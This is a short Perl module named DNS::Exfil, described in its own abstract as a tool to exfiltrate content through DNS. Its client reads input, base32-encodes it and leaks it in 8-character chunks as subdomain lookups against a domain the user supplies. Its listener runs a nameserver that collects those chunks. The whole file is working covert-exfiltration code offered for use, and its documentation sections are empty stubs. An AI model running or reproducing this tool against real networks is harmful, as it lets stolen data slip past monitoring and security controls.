package DNS::Exfil;

use strict;
use warnings;
use 5.010;

use Net::DNS::Nameserver;
use Net::DNS;
use MIME::Base32;

# VERSION: .1
# PODNAME: DNS::Exfil
# ABSTRACT: Exfiltrate content out through DNS.

=encoding utf8

=head1 SYNOPSIS

=head1 DESCRIPTION

=head1 ERRORS 

=head1 METHODS

=head2 listener

=cut

sub listener {
    my %cmd_args = @_;

    my @request_stack;
    say "Listening...";
    my $ns = Net::DNS::Nameserver->new(
        LocalAddr => ['0.0.0.0'],
        ReplyHandler => sub { dns_worker(\@request_stack, @_) } 
    );

    use Data::Printer;
    while (!$ns->loop_once(1)) {
        p @request_stack;
    }
}

sub dns_worker {
    my $stack_r = shift;
    my ( $qname, $qclass, $qtype, $peerhost, $query, $conn ) = @_;
    say $qname;
    my $base32 = [ split('\.', $qname) ]->[0];
    push @{$stack_r}, $base32;
}



=head2 client

=cut

sub client {
    my %cmdline_args = @_;
    my $exfil_domain = $cmdline_args{domain};

    say $exfil_domain;

    while (<STDIN>) {
        chomp;
        say {*STDERR} "$_";
        my @chunks = unpack('(A8)*', MIME::Base32::encode($_));

        rr("start-exfil.$exfil_domain");
        for my $chunk (@chunks) {
            my $responnse = rr("$chunk.$exfil_domain");
        }
        rr("stop-exfil.$exfil_domain");
    }
}


1;
